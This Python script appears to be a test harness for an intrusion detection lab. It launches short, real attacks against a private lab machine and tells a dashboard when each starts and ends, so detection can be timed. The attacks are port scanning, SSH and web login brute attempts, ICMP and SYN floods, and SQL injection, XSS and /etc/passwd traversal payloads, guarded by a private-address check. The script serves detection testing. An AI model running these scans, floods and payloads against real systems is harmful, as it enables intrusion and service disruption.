#!/usr/bin/env python3
"""
Real attack test for YOUR OWN LAB. Run it from the attacker/traffic VM.
It performs genuine (small, short) attacks against a machine you own, and tells
the IDPS manager when each one starts and ends, so the dashboard can build the
expected-versus-detected table with detection times.

    python3 lab_attacks.py --manager http://192.168.56.10:5000 --token <TOKEN> \
        --target 192.168.56.20 [--web http://192.168.56.20] [--only port_scan,ssh_brute]

Safety:
  * Refuses any target that is not a private/loopback address.
  * Asks you to type YES first (skip with --yes).
  * Floods last 2-3 seconds. Needs only the Python standard library.
  * The ping flood needs root (raw sockets); it is skipped otherwise.
Never point this at a machine or network you do not own.
"""
import argparse
import concurrent.futures
import ipaddress
import json
import os
import socket
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

GAP = 12   # seconds between attacks (the dashboard merges identical alerts within 10 s)


def mark(args, attack=None, phase="start", run_id=None):
    body = {"attack": attack, "phase": phase, "run_id": run_id}
    req = urllib.request.Request(args.manager.rstrip("/") + "/api/sim/mark", data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json", "X-Sim-Token": args.token})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read()).get("run_id")
    except Exception as e:
        print("   (could not reach the manager: %s)" % e)
        return None


def tcp_syn(target, port, timeout=0.4):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((target, port))
    except OSError:
        pass
    finally:
        s.close()


def port_scan(a):
    with concurrent.futures.ThreadPoolExecutor(60) as ex:
        list(ex.map(lambda p: tcp_syn(a.target, p), range(1, 301)))


def ssh_brute(a):
    for _ in range(9):
        tcp_syn(a.target, 22, 1.0)
        time.sleep(0.5)


def _cksum(b):
    if len(b) % 2:
        b += b"\0"
    s = sum(struct.unpack("!%dH" % (len(b) // 2), b))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def icmp_flood(a):
    if os.name == "nt" or os.geteuid() != 0:
        raise RuntimeError("needs root (run with sudo)")
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    for i in range(160):
        hdr = struct.pack("!BBHHH", 8, 0, 0, os.getpid() & 0xFFFF, i)
        pkt = struct.pack("!BBHHH", 8, 0, _cksum(hdr + b"idps-lab-test"), os.getpid() & 0xFFFF, i) + b"idps-lab-test"
        s.sendto(pkt, (a.target, 0))
        time.sleep(0.012)
    s.close()


def syn_flood(a):
    port = 80
    with concurrent.futures.ThreadPoolExecutor(80) as ex:
        list(ex.map(lambda _: tcp_syn(a.target, port, 0.3), range(400)))


def _get(url):
    try:
        urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"}), timeout=5).read()
    except Exception:
        pass


def sqli(a):
    _get(a.web.rstrip("/") + "/?id=1%27%20OR%20%271%27=%271")


def xss(a):
    _get(a.web.rstrip("/") + "/?q=%3Cscript%3Ealert(1)%3C/script%3E")


def traversal(a):
    _get(a.web.rstrip("/") + "/..%2f..%2f..%2fetc%2fpasswd")


def web_brute(a):
    for _ in range(14):
        try:
            urllib.request.urlopen(urllib.request.Request(a.web.rstrip("/") + "/login", data=b"u=admin&p=x", method="POST"), timeout=5).read()
        except Exception:
            pass
        time.sleep(0.2)


def honeypot(a):
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((a.target, a.honeypot_port))
        s.recv(100)
        s.sendall(b"SSH-2.0-lab-test\r\n")
    except OSError:
        pass
    finally:
        s.close()


ATTACKS = [("port_scan", port_scan, False), ("ssh_brute", ssh_brute, False), ("icmp_flood", icmp_flood, False),
           ("syn_flood", syn_flood, False), ("sqli", sqli, True), ("xss", xss, True), ("traversal", traversal, True),
           ("web_brute", web_brute, True), ("honeypot", honeypot, False)]


def main():
    ap = argparse.ArgumentParser(description="Real lab attack test for your own machines")
    ap.add_argument("--manager", required=True)
    ap.add_argument("--token", required=True, help="from the dashboard's Simulator page")
    ap.add_argument("--target", required=True, help="private IP of the lab machine to attack")
    ap.add_argument("--web", help="http://<target> for the website attacks (needs a host agent there)")
    ap.add_argument("--honeypot-port", type=int, default=2222)
    ap.add_argument("--only", help="comma list, e.g. port_scan,ssh_brute")
    ap.add_argument("--yes", action="store_true")
    a = ap.parse_args()

    try:
        ip = ipaddress.ip_address(socket.gethostbyname(a.target))
    except (ValueError, OSError):
        sys.exit("Cannot understand the target address.")
    if not (ip.is_private or ip.is_loopback or ip.is_link_local):
        sys.exit("REFUSED: %s is a public address. This tool only attacks private lab machines you own." % ip)
    a.target = str(ip)
    chosen = [x for x in ATTACKS if not a.only or x[0] in a.only.split(",")]
    runnable = [x for x in chosen if not x[2] or a.web]
    if not a.yes:
        print("About to attack %s (a private lab address) with: %s" % (a.target, ", ".join(x[0] for x in runnable)))
        if input("Type YES if you own this machine and want to continue: ").strip() != "YES":
            sys.exit("Cancelled.")
    print("Starting. Total time about %d seconds.\n" % (len(runnable) * (GAP + 4)))
    for name, fn, _ in runnable:
        print("-> %s" % name, flush=True)
        rid = mark(a, name, "start")
        try:
            fn(a)
            print("   done")
        except Exception as e:
            print("   skipped: %s" % e)
        time.sleep(2)
        mark(a, name, "end", rid)
        time.sleep(GAP)
    print("\nFinished. Open the dashboard > Simulator and tests > Refresh results.")


if __name__ == "__main__":
    main()
